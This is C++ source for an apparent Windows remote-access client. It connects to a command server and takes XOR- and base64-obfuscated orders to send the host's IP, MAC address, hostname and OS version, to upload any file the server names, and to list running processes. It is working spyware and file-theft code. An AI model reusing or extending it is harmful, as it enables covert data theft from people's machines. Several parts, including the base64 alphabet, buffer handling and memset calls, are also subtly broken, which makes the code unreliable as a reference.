#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <iphlpapi.h>
#include <fstream>
#include <string>
#include <iostream>
#include <sstream> //std::stringstream

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Mswsock.lib")
#pragma comment(lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"

#include <stdio.h>
#include <Windows.h>
#include <Iphlpapi.h>
#include <Assert.h>
#pragma comment(lib, "iphlpapi.lib")
#pragma warning(disable : 4996)

#include <iostream>
#include <bitset>

static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"1234567890+/";

std::string base64_encode(unsigned char const*, unsigned int len);
std::string base64_decode(std::string const& s);
std::string XOR(std::string value, std::string key);

static inline bool is_base64(unsigned char c) {
    return (isalnum(c) || (c == '+') || (c == '/'));
}

std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
    std::string ret = "";
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    while (in_len--) {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; (i < 4); i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i)
    {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (j = 0; (j < i + 1); j++)
            ret += base64_chars[char_array_4[j]];

        while ((i++ < 3))
            ret += '=';

    }

    return ret;

}

std::string base64_decode(std::string const& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::string ret;

    while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; (i < 3); i++)
                ret += char_array_3[i];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++)
            char_array_4[j] = 0;

        for (j = 0; j < 4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
    }

    return ret;
}

std::string XOR(std::string value, std::string key)
{
    std::string retval(value);
    long unsigned int klen = key.length();
    long unsigned int vlen = value.length();
    unsigned long int k = 0;
    unsigned long int v = 0;
    for (; v < vlen; v++) {
        retval[v] = value[v] ^ key[k];
        k = (++k < klen ? k : 0);
    }
    return retval;
}

struct tuple1
{
    char *ipAddress;
    char *macAddress;
};

tuple1 getMAC()
{
    PIP_ADAPTER_INFO AdapterInfo;
    DWORD dwBufLen = sizeof(IP_ADAPTER_INFO);
    char *mac_addr = (char *)malloc(18);
    char *ipAddress = (char *)malloc(15);
    tuple1 returnValues = {NULL, NULL};

    AdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
    if (AdapterInfo == NULL)
    {
        printf("Error allocating memory needed to call GetAdaptersinfo\n");
        free(mac_addr);
        return returnValues; // it is safe to call free(NULL)
    }

    // Make an initial call to GetAdaptersInfo to get the necessary size into the dwBufLen variable
    if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW)
    {
        free(AdapterInfo);
        AdapterInfo = (IP_ADAPTER_INFO *)malloc(dwBufLen);
        if (AdapterInfo == NULL)
        {
            printf("Error allocating memory needed to call GetAdaptersinfo\n");
            free(mac_addr);
            return returnValues;
        }
    }

    if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR)
    {
        // Contains pointer to current adapter info
        PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
            // technically should look at pAdapterInfo->AddressLength
            //   and not assume it is 6.
        sprintf(mac_addr, "%02X:%02X:%02X:%02X:%02X:%02X",
        pAdapterInfo->Address[0], pAdapterInfo->Address[1],
        pAdapterInfo->Address[2], pAdapterInfo->Address[3],
        pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
        //printf("Address: %s, mac: %s\n", pAdapterInfo->IpAddressList.IpAddress.String, mac_addr);

            //pulls IPs
        memcpy(ipAddress, pAdapterInfo->IpAddressList.IpAddress.String, strlen(ipAddress));
        //printf("Address: %s, mac: %s\n", ipAddress, mac_addr);

            // print them all, return the last one.
            // return mac_addr;

        printf("\n");

        pAdapterInfo = pAdapterInfo->Next;
        returnValues = {ipAddress, mac_addr};

    }
    free(AdapterInfo);
    return returnValues; // caller must free.
}

using namespace std;

string PrintProcessNameAndID(DWORD processID)
{
    TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

    // Get a handle to the process.

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
                                      PROCESS_VM_READ,
                                  FALSE, processID);

    // Get the process name.

    if (NULL != hProcess)
    {
        HMODULE hMod;
        DWORD cbNeeded;

        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
                               &cbNeeded))
        {
            GetModuleBaseName(hProcess, hMod, szProcessName,
                              sizeof(szProcessName) / sizeof(TCHAR));
        }
    }

    // Print the process name and identifier.

    _tprintf(TEXT("%s  (PID: %u)\n"), szProcessName, processID);

    // Release the handle to the process.
    stringstream s;
    s << "" << szProcessName << " PID:" << processID << endl;
    ;
    CloseHandle(hProcess);
    return s.str();
}

string convertToString(char* a)
{
    string s(a);

    return s;
}

std::string decryption(char* cipher, int size)
{
    string decrypted = "";
    string q = ":&";
    string decryptedString = "";
    decrypted = XOR(cipher, q);
    char* decrypt = new char[strlen(decrypted.c_str())];
    //decryptedString = decrypted; //.substr(0, decrypted.find("=")) + "=";
    strcpy(decrypt, decrypted.c_str());
    decrypted = base64_decode(decrypt);
    return decrypted;
}

std::string encryption(char* cipher, int size)
{
    string encrypted = base64_encode((unsigned char*)cipher, strlen(cipher));
    string q = ":&";
    encrypted = XOR(encrypted, q);
    char* encrypt = new char[strlen(encrypted.c_str())];
    strcpy(encrypt, encrypted.c_str());
    return encrypt;
}

int __cdecl main(int argc, char **argv)
{
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;
    //
    //
    //These are the bytes being sent
    //const char *sendbuf = "What if we chnage this what does it do";
    //
    //
    //

    tuple1 information = getMAC();

    char* recvbuf = new char[DEFAULT_BUFLEN];
    int iResult = 0;
    int recvbuflen = DEFAULT_BUFLEN;
    string decryptedString2 = "";

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0)
    {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo("127.0.0.1", DEFAULT_PORT, &hints, &result);
    if (iResult != 0)
    {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
    {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
                               ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET)
        {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR)
        {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET)
    {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }

    // Send an initial buffer
    //
    //
    //
    while (true)
    {
        cout << "\t----------Waiting for instructions---------------" << endl;
        char* username = new char[UNLEN + 1];
        int username_len = UNLEN + 1;
        gethostname(username, username_len);
        iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
        decryptedString2 = convertToString(recvbuf);
        decryptedString2 = decryption(recvbuf, strlen(recvbuf));
        string rc = string(decryptedString2);
        string encryptedString = "0";
        char* encrypted_star = new char[512];
        if (rc.find("1") != std::string::npos)
        {
            
            OSVERSIONINFOEX info;
            ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
            info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
            GetVersionEx((LPOSVERSIONINFO)&info);//info requires typecasting

            printf("Windows version: %u.%u\n", info.dwMajorVersion, info.dwMinorVersion);
            information.ipAddress += '\000';
            information.macAddress += '\000';
            cout << information.ipAddress << "..." << endl;
            encryptedString = encryption(information.ipAddress, strlen(information.ipAddress));
            strcpy(encrypted_star, encryptedString.c_str());
            iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);
            iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
            decryptedString2 = convertToString(recvbuf);
            decryptedString2 = decryption(recvbuf, strlen(recvbuf));

            encryptedString = encryption(information.macAddress, strlen(information.macAddress));
            strcpy(encrypted_star, encryptedString.c_str());
            cout << information.macAddress << "..." << endl;
            iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);

            cout << username << "..." << endl;
            encryptedString = encryption(username, strlen(username));
            strcpy(encrypted_star, encryptedString.c_str());
            iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);

            std::ostringstream stream;
            stream << info.dwMajorVersion;
            char string1[sizeof(info.dwMajorVersion)];
            strcpy(string1, stream.str().c_str());

            encryptedString = encryption(string1, strlen(string1));
            strcpy(encrypted_star, encryptedString.c_str());
            iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);
            memset(recvbuf, 0, sizeof recvbuf);
            memset(username, 0, sizeof username);
            memset(encrypted_star, 0, sizeof encrypted_star);

            cout << "Sending the information" << endl;
        }
        else if (rc.find("2") != std::string::npos)
        {
            char temp1[256];
            iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
            decryptedString2 = decryption(recvbuf, strlen(recvbuf));
            strcpy(temp1, decryptedString2.c_str());
            temp1[iResult] = 0;
            cout << "Server requested for file : " << temp1 << endl;
            ifstream myfile(temp1);
            if (myfile.is_open())
            {
                strcpy(encrypted_star, "1");
                encryptedString = encryption(encrypted_star, strlen(encrypted_star));
                strcpy(encrypted_star, encryptedString.c_str());
                iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);
                myfile.close();
                FILE *f = fopen(temp1, "rb");
                fseek(f, 0, SEEK_END);
                long fsize = ftell(f);
                fseek(f, 0, SEEK_SET);
                char *content = (char *)malloc(fsize + 1);
                fread(content, fsize, 1, f);
                fclose(f);
                iResult = recv(ConnectSocket, recvbuf, strlen(recvbuf), 0);
                decryptedString2 = decryption(recvbuf, strlen(recvbuf));
                std::ostringstream oss;
                oss << fsize;
                strcpy(encrypted_star, oss.str().c_str());
                encryptedString = encryption(encrypted_star, strlen(encrypted_star));
                strcpy(encrypted_star, encryptedString.c_str());
                iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);
                iResult = recv(ConnectSocket, recvbuf, strlen(recvbuf), 0);
                //decryptedString2 = decryption(recvbuf, strlen(recvbuf));
                //encryptedString = encryption(content, strlen(content));
                //strcpy(encrypted_star, encryptedString.c_str());
                iResult = send(ConnectSocket, content, strlen(content), 0);
                cout << "File sent" << endl;
                memset(recvbuf, 0, sizeof recvbuf);
                memset(encrypted_star, 0, sizeof encrypted_star);
            }
            else
            {
                strcpy(encrypted_star, "2");
                encryptedString = encryption(encrypted_star, strlen(encrypted_star));
                strcpy(encrypted_star, encryptedString.c_str());
                iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);
                cout << "failed to open the file" << endl;
            }
        }
        else if (rc.find("3") != std::string::npos)
        {
            cout << "Running processes requested" << endl;
            DWORD aProcesses[1024], cbNeeded, cProcesses;
            unsigned int i;

            if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
            {
                strcpy(encrypted_star, "2");
                encryptedString = encryption(encrypted_star, strlen(encrypted_star));
                strcpy(encrypted_star, encryptedString.c_str());
                iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);
                cout << "Failed to get the pocesses" << endl;
                continue;
            }
            else
            {
                strcpy(encrypted_star, "1");
                encryptedString = encryption(encrypted_star, strlen(encrypted_star));
                strcpy(encrypted_star, encryptedString.c_str());
                iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);
                cout << "Getting all the running processess" << endl;
            }
            iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
            decryptedString2 = decryption(recvbuf, strlen(recvbuf));

            // Calculate how many process identifiers were returned.

            cProcesses = cbNeeded / sizeof(DWORD);

            // Print the name and process identifier for each process.
            string data = "";
            for (i = 0; i < cProcesses; i++)
            {
                if (aProcesses[i] != 0)
                {
                    data += PrintProcessNameAndID(aProcesses[i]);
                }
            }
            //iResult = send(ConnectSocket, to_string(data.length()).c_str(), strlen(to_string(data.length()).c_str()), 0);
            //iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
            string temp = "";
            int templn = recvbuflen-16;
            int ie = 0;
            while (ie < data.length())
            {
                if(ie+templn>data.length()){
                    temp = data.substr(ie);
                }{
                    temp = data.substr(ie, templn);
                }
                
                ie += templn;
                // cout<<temp<<"--------------------"<<endl;
                // cout<<ie<<"/"<<data.length()<<"--"<<strlen(data.c_str())<<endl;
                //iResult = send(ConnectSocket, temp.c_str(), temp.length(), 0);
                //iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
                memset(recvbuf, 0, sizeof recvbuf);
                memset(encrypted_star, 0, sizeof encrypted_star);

            }
        }
        else
        {

            cout << "Wrong choice, please input 1, 2 or 3 on server" << endl;
        }
    }

    //
    //
    //

    printf("Bytes Sent: %ld\n", iResult);

    // shutdown the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR)
    {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    // Receive until the peer closes the connection

    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();

    return 0;
}
